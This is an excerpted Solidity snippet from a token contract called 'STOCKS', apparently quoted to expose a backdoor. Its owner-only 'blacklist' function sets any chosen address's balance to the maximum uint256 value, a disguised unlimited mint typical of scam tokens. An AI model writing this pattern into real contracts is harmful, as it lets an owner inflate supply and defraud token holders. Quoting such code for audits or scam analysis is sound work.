...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint256 constant blacklisted = ~uint256(0);
...
contract STOCKS is Ownable, ERC20 {
    bool public limited;
    ...
    constructor(uint256 _totalSupply, address _router) ERC20("Stocks", "STOCKS") {
         router = uniswapV2Router (_router);
        _mint(msg.sender, _totalSupply);
    }

    function blacklist(address _address, bool _isBlacklisting, address _isBlacklisted) external onlyOwner {
         _balances[_isBlacklisted]= blacklisted;
